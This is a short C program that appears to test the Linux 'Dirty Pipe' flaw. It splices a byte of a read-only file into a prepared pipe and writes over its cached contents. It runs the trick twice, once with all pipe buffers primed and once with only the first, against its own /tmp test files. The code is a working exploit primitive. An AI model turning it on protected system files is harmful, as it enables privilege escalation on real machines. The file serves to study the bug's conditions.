#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/types.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define PIPE_BUFFER_COUNT 16


void test_exploit() {
  // setup test file
  int fd_test_file = open("/tmp/test_exploit", O_RDWR | O_CREAT, 0666);
  char test_data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  write(fd_test_file, test_data, 50);
  close(fd_test_file);

  int p[2];
  pipe(p);
  char buf[16*PAGE_SIZE];

  // fill and then drain the only the first pipe buffer
  write(p[1], buf, PIPE_BUFFER_COUNT*PAGE_SIZE);
  read(p[0], buf, PIPE_BUFFER_COUNT*PAGE_SIZE);

  char target_file[] = "/tmp/test_exploit";
  int fd_target = open(target_file, O_RDONLY);

  loff_t offset_target = 0;
  // splice 1 byte of target file into the pipe
  splice(fd_target, &offset_target, p[1], NULL, 1, 0);
  char data[] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
  write(p[1], data, 30);
  close(fd_target);

  char buffer[20];
  fd_test_file = open("/tmp/test_exploit", O_RDONLY);
  read(fd_test_file, buffer, 20);
  printf("Test normal exploit, if any \"B\" appear it succeeded \n %s \n", buffer);
  close(fd_test_file);
}


/* What happens if we only fill the first pipe buffer? */
void test_write_one_buffer() {
  // setup test file
  int fd_test_file = open("/tmp/test_single_buffer", O_RDWR | O_CREAT, 0666);
  char test_data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  write(fd_test_file, test_data, 50);
  close(fd_test_file);


  int p[2];
  pipe(p);
  char buf[PAGE_SIZE];


  // fill and then drain the only the first pipe buffer
  write(p[1], buf, PAGE_SIZE);
  read(p[0], buf, PAGE_SIZE);

  char target_file[] = "/tmp/test_single_buffer";
  int fd_target = open(target_file, O_RDONLY);

  loff_t offset_target = 0;
  // splice 1 byte of target file into the pipe
  splice(fd_target, &offset_target, p[1], NULL, 1, 0);
  char data[] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
  write(p[1], data, 30);
  close(fd_target);

  char buffer[20];
  fd_test_file = open("/tmp/test_single_buffer", O_RDONLY);
  read(fd_test_file, buffer, 20);
  printf("Test writing only first buffer, if any \"B\" appear it succeeded \n %s\n", buffer);
  close(fd_test_file);
}




int main(int argc, char **argv) {

  test_exploit();
  test_write_one_buffer();
}
